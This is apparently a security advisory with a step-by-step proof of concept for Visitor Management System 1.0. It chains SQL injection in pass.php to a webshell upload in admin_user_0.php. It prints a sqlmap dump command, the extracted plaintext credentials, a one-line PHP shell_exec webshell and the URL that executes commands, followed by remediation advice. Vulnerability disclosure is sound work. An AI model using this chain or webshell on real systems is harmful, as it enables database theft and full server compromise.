# Visitor Management System 1.0 - SQLi to Remote Code Execution (Attack Chain)

## Vulnerability Information

| Field | Details |
|---|---|
| **Product** | Visitor Management System |
| **Vendor** | code-projects.org |
| **Version** | 1.0 |
| **Vulnerability Classes** | SQL Injection (CWE-89) + Unrestricted File Upload (CWE-434) |
| **CVE ID** | Pending |
| **CVSS Score** | 9.8 Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Authentication Required** | Low privilege (guard account) as entry point |
| **Affected Files** | `/vms/php/pass.php`, `/vms/php/admin_user_0.php` |
| **Vulnerable Parameter** | `phone` (POST) |

---

## Description

The Visitor Management System 1.0 by code-projects.org is vulnerable to a critical attack chain combining SQL Injection and Unrestricted File Upload leading to Remote Code Execution.

An attacker with low-privilege access (guard account) can exploit a SQL injection vulnerability in `pass.php` via the `phone` POST parameter to dump the entire database — including plaintext admin credentials. Using the extracted credentials to authenticate as admin, the attacker can then upload a PHP webshell through the Admin User management panel (`admin_user_0.php`), which performs no file type or extension validation. The uploaded webshell is stored in a web-accessible directory and can be executed directly via URL, resulting in full Remote Code Execution on the server.

**Additionally, passwords are stored in plaintext in the database**, meaning no cracking step is required after the SQLi dump.

---

## Attack Chain Overview

```
Low-priv guard login
        ↓
SQL Injection in pass.php (phone parameter)
        ↓
sqlmap dump → plaintext admin credentials extracted
        ↓
Login as admin (sanjay1:7861)
        ↓
Unrestricted file upload in admin_user_0.php
        ↓
PHP webshell uploaded to /vms/php/folder/
        ↓
RCE via ?cmd=whoami → full server compromise
```

---

## Step-by-Step Proof of Concept

### Step 1 — Login as Low Privilege User (Guard)

Navigate to the VMS application and login with guard credentials. After login, navigate to the Phone Number page:

```
http://<TARGET>/vms/php/phone_0.php
```

<img width="1920" height="1080" alt="Screenshot 2026-05-05 034206" src="https://github.com/user-attachments/assets/2306fe0a-a3bc-4e26-a12a-1a284dc3efd8" />


---

### Step 2 — Confirm SQL Injection in pass.php

Submit a single quote `'` as the phone number value. The application throws a fatal MariaDB error exposing the raw query and file path:

```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right 
syntax to use near '2026-05-05'' at line 1 in 
C:\xampp\htdocs\vms\php\pass.php:9
Stack trace:
#0 C:\xampp\htdocs\vms\php\pass.php(9): mysqli_query(Object(mysqli), 'select * from i...')
```

**Affected file:** `pass.php` line 9  
**Vulnerable parameter:** `phone` (POST)

<img width="1920" height="1080" alt="Screenshot 2026-05-05 034215" src="https://github.com/user-attachments/assets/13d7c9f2-e832-40e4-9a51-26665b0a6134" />

sql error
<img width="1920" height="1080" alt="Screenshot 2026-05-05 034228" src="https://github.com/user-attachments/assets/3c107715-53c8-4ec1-b264-c0879c43c0e4" />


---

### Step 3 — Exploit SQLi with sqlmap

Save the Burp Suite captured request to a file (`sqli.txt`) and run sqlmap:

```bash
sqlmap -r sqli.txt --dump --batch
```

sqlmap successfully dumps the `login_user` table from the `vms` database, revealing **plaintext credentials** for all users:

```
Database: vms
Table: login_user
[2 entries]
+----+---------+------------+---------+-------+--------+----------+-----------+
| id | image   | phone      | name    | user  | gender | password | username  |
+----+---------+------------+---------+-------+--------+----------+-----------+
| 1  | <blank> | 8146905071 | sanjay  | guard | male   | 786      | sanjay123 |
| 2  | <blank> | 8146905071 | sanjay1 | admin | male   | 7861     | sanjay1   |
+----+---------+------------+---------+-------+--------+----------+-----------+
```

Note: Passwords are stored in **plaintext** — no hash cracking required.

<img width="1920" height="1080" alt="Screenshot 2026-05-05 034316" src="https://github.com/user-attachments/assets/494f1dae-7980-4d0c-948e-39eb58fb641e" />


---

### Step 4 — Login as Admin

Using the extracted admin credentials, login to the admin panel:

```
Username: sanjay1
Password: 7861
```

The full admin dashboard is now accessible including Employee, Department, Admin User, and Report management.

<img width="1920" height="1080" alt="Screenshot 2026-05-05 034353" src="https://github.com/user-attachments/assets/76e9bb8c-9128-4dcb-bcdf-3eb45d8756ca" />



---

### Step 5 — Upload PHP Webshell via Admin User Panel

Navigate to the Admin User management page:

```
http://<TARGET>/vms/php/admin_user_0.php
```

The page contains a file upload field for a profile image. The application performs **no file type validation, no extension filtering, and no MIME type checking**.

Fill in the form with any values and upload the following PHP webshell as the image file (`web2_command.php`):

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

<img width="1920" height="1080" alt="Screenshot 2026-05-05 034416" src="https://github.com/user-attachments/assets/20193b0f-30b4-4b5c-854c-70d7bcfd2e2a" />


---

### Step 6 — Confirm Webshell Upload

Navigate to the Admin User display page:

```
http://<TARGET>/vms/php/admin_display_0.php
```

The newly created admin account is visible in the table. The uploaded webshell is stored at:

```
http://<TARGET>/vms/php/folder/web2_command.php
```

<img width="1920" height="1080" alt="Screenshot 2026-05-05 034429" src="https://github.com/user-attachments/assets/3e720223-a95c-4db3-951d-5d502ac8a369" />


---

### Step 7 — Remote Code Execution

Execute arbitrary system commands via the webshell:

```
http://<TARGET>/vms/php/folder/web2_command.php?cmd=whoami
```

**Result:** The server returns the current system user confirming full Remote Code Execution:

```
desktop-g1i9np3\dell
```

<img width="1920" height="1080" alt="Screenshot 2026-05-05 034438" src="https://github.com/user-attachments/assets/8df223f3-726f-4db3-9b1a-a9492fb34c6d" />


---

## Impact

- **Full database compromise** — all tables dumped via SQLi including plaintext credentials
- **Admin account takeover** — plaintext passwords require no cracking
- **Remote Code Execution** — arbitrary OS commands executed as the web server user
- **Full server compromise** — complete control over the underlying host
- **Plaintext password storage** — amplifies the SQLi impact, credentials immediately usable

---

## Affected Files Summary

| File | Vulnerability |
|---|---|
| `/vms/php/pass.php` | SQL Injection via `phone` POST parameter |
| `/vms/php/admin_user_0.php` | Unrestricted File Upload — no extension or MIME validation |
| `/vms/php/folder/` | Webshell storage directory — web accessible, no restrictions |

---

## Remediation

**For SQL Injection:**
```php
$stmt = $conn->prepare("SELECT * FROM login_user WHERE phone = ?");
$stmt->bind_param("s", $phone);
$stmt->execute();
```

**For File Upload:**
- Whitelist allowed extensions (jpg, png, gif only)
- Validate MIME type server-side
- Store uploads outside the webroot
- Rename uploaded files to random strings

**For Password Storage:**
- Use `password_hash()` and `password_verify()` — never store plaintext

---

## References

- [Vendor Homepage](https://code-projects.org/visitor-management-system-in-php-with-source-code/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

---

## Discoverer

- **Researcher:** Imad Alvi
- **VulDB:** imad alvi
